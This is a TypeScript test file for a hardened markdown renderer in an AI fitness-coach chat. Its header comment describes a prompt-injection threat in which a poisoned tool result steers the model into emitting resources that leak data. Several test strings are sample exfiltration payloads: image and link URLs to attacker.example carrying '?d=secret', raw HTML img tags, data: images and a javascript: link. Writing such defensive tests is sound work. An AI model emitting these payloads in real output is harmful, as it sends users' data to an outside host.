import { readFileSync } from 'node:fs'
import { join } from 'node:path'
import { renderToStaticMarkup } from 'react-dom/server'
import { describe, expect, it } from 'vitest'
import { CoachMarkdown, COACH_MARKDOWN_HARDENING } from './coach-markdown'

/**
 * The hardening is asserted by RENDERING hostile markdown, not by inspecting
 * props: the allowlists live inside a rehype plugin tuple, and streamdown owns
 * how that tuple is applied — behaviour is the only contract worth pinning.
 * Every hostile case is the exfil shape the coach threat model names: a
 * poisoned tool result steering the model into emitting a resource that the
 * victim's browser fetches on sight.
 */

const render = (markdown: string) =>
  renderToStaticMarkup(<CoachMarkdown>{markdown}</CoachMarkdown>)

describe('CoachMarkdown', () => {
  it('still renders ordinary coach markdown', () => {
    const html = render('**Bench** 5x5 at 100 kg\n\n- top set\n- back-offs')
    // Streamdown renders emphasis as styled spans tagged data-streamdown,
    // not bare <strong> — assert its own vocabulary.
    expect(html).toContain('data-streamdown="strong"')
    expect(html).toContain('Bench')
    expect(html).toContain('data-streamdown="list-item"')
  })

  it('drops a markdown image to an external host without a trace', () => {
    const html = render('Nice session! ![p](https://attacker.example/x.png?d=secret)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('attacker.example')
    expect(html).toContain('Nice session!')
  })

  it('drops a RAW HTML image too — the sanitize step alone would let it through', () => {
    const html = render('look <img src="https://attacker.example/raw.png"> here')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('attacker.example')
  })

  it('blocks data: images (allowDataImages off)', () => {
    const html = render('![b](data:image/png;base64,AAAA)')
    expect(html).not.toContain('<img')
    expect(html).not.toContain('data:image')
  })

  it('blocks even relative images — the allowlist is empty, not origin-scoped', () => {
    expect(render('![p](/p.png)')).not.toContain('<img')
  })

  it('flattens links to their text: no anchor, no URL left to tap', () => {
    const html = render('[tap here](https://attacker.example/?d=secret)')
    expect(html).not.toContain('<a')
    expect(html).not.toContain('attacker.example')
    expect(html).toContain('tap here')
  })

  it('never lets a javascript: link survive in any form', () => {
    const html = render('[open](javascript:alert(1))')
    expect(html).not.toContain('javascript:')
    expect(html).toContain('open')
  })

  it('keeps both allowlists empty — the config half of the behavioural pins above', () => {
    expect(COACH_MARKDOWN_HARDENING.allowedImagePrefixes).toEqual([])
    expect(COACH_MARKDOWN_HARDENING.allowedLinkPrefixes).toEqual([])
    expect(COACH_MARKDOWN_HARDENING.allowDataImages).toBe(false)
  })
})

describe('coach-chat call site', () => {
  it('renders model text through CoachMarkdown, never bare Streamdown', () => {
    // Same guard idiom as src/app/layout.test.ts: the hardened wrapper only
    // protects the surface that actually uses it.
    const source = readFileSync(join(process.cwd(), 'src/app/coach/coach-chat.tsx'), 'utf8')
    expect(source).not.toMatch(/from 'streamdown'/)
    expect(source).toContain('<CoachMarkdown>')
  })
})
